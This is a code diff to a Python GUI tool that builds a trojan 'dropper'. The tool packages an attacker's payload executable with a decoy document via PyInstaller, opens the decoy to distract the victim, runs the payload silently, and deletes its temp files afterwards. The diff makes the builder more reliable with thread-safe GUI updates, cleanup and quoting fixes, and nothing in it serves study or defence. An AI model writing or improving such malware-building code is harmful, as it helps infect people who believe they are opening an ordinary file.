@@ -5,7 +5,6 @@ import tempfile
 import sys
 import tkinter as tk
 from tkinter import ttk, filedialog, messagebox
-from PIL import Image
 import threading # Use threading to keep the GUI responsive during compilation
 
 # --- Configuration ---
@@ -18,17 +17,44 @@ class IORedirector:
         self.text_widget = text_widget
 
     def write(self, s):
-        self.text_widget.insert(tk.END, s)
-        self.text_widget.see(tk.END) # Scroll to the end
-        self.text_widget.update() # Force update
+        def _append():
+            self.text_widget.insert(tk.END, s)
+            self.text_widget.see(tk.END)
+
+        try:
+            if threading.current_thread() is threading.main_thread():
+                _append()
+            else:
+                self.text_widget.after(0, _append)
+        except Exception:
+            pass
 
     def flush(self):
         pass # Required for file-like objects
+
+
+def _ui_notify(root_widget, level, title, message):
+    notifier = messagebox.showerror if level == "error" else messagebox.showinfo
+
+    def _show():
+        notifier(title, message)
+
+    try:
+        if root_widget is None:
+            _show()
+            return
+        if threading.current_thread() is threading.main_thread():
+            _show()
+        else:
+            root_widget.after(0, _show)
+    except Exception:
+        pass
 
 # --- Core Dropper Logic (Modified for Cleanliness) ---
 
 def create_icon_from_image(image_path, icon_path):
     try:
+        from PIL import Image
         img = Image.open(image_path)
         icon_sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)]
         img.save(icon_path, format="ICO", sizes=icon_sizes)
@@ -46,6 +72,7 @@ import subprocess
 import tempfile
 import sys
 import shutil
+import time
 
 def get_resource_path(relative_path):
     try:
@@ -55,12 +82,13 @@ def get_resource_path(relative_path):
     return os.path.join(base_path, relative_path)
 
 def execute_payload():
-    DECOY_NAME = "{decoy_name}"
-    PAYLOAD_NAME = "{payload_name}"
+    DECOY_NAME = {decoy_name!r}
+    PAYLOAD_NAME = {payload_name!r}
 
-    temp_dir = tempfile.mkdtemp()
+    temp_dir = None
 
     try:
+        temp_dir = tempfile.mkdtemp(prefix='fudmal_')
         bundled_decoy_path = get_resource_path(DECOY_NAME)
         bundled_payload_path = get_resource_path(PAYLOAD_NAME)
 
@@ -83,12 +111,19 @@ def execute_payload():
             subprocess.Popen(['xdg-open', decoy_path_out])
         else:
             subprocess.Popen(['open', decoy_path_out])
+
+        # Wait for the viewer to open the file before cleaning up
+        time.sleep(5)
             
     except Exception as e:
         pass # Fail silently
         
     finally:
-        pass # Omit cleanup for simplicity in the executor script
+        if temp_dir:
+            try:
+                shutil.rmtree(temp_dir, ignore_errors=True)
+            except Exception:
+                pass
 
 if __name__ == '__main__':
     execute_payload()
@@ -99,7 +134,7 @@ if __name__ == '__main__':
     return script_path
 
 
-def build_dropper(payload_path, decoy_path, output_name, output_dir):
+def build_dropper(payload_path, decoy_path, output_name, output_dir, notify_widget=None):
     
     if not os.path.isfile(payload_path):
         raise FileNotFoundError(f"[!] Payload EXE not found at: {payload_path}")
@@ -152,7 +187,7 @@ def build_dropper(payload_path, decoy_path, output_name, output_dir):
         
         print("\n[INFO] Running PyInstaller command...")
         
-        subprocess.run(pyinstaller_cmd, cwd=temp_dir, check=True)
+        subprocess.run(pyinstaller_cmd, cwd=temp_dir, check=True, capture_output=True, text=True)
 
         # --- 5. Final Move and Cleanup ---
         # Generated EXE path inside the temp/dist folder
@@ -164,11 +199,11 @@ def build_dropper(payload_path, decoy_path, output_name, output_dir):
         shutil.move(generated_exe_path, final_destination)
 
         print(f"\n[+] Success! Final dropper created: {final_destination}")
-        messagebox.showinfo("Success", f"Dropper created successfully at:\n{final_destination}")
+        _ui_notify(notify_widget, "info", "Success", f"Dropper created successfully at:\n{final_destination}")
 
     except Exception as e:
         print(f"\n[CRITICAL ERROR] Build failed: {e}")
-        messagebox.showerror("Error", f"The build failed: {e}")
+        _ui_notify(notify_widget, "error", "Error", f"The build failed: {e}")
         raise # Re-raise to ensure the caller (GUI thread) knows it failed
     
     finally:
@@ -312,7 +347,7 @@ class DropperGUI(tk.Tk):
     def run_build(self, payload_path, decoy_path, output_name, output_dir):
         """The function run in the thread, wrapping the build_dropper logic."""
         try:
-            build_dropper(payload_path, decoy_path, output_name, output_dir)
+            build_dropper(payload_path, decoy_path, output_name, output_dir, self)
         finally:
             # Re-enable the button in the main GUI thread after completion/failure
             self.after(0, self.build_button.config, 
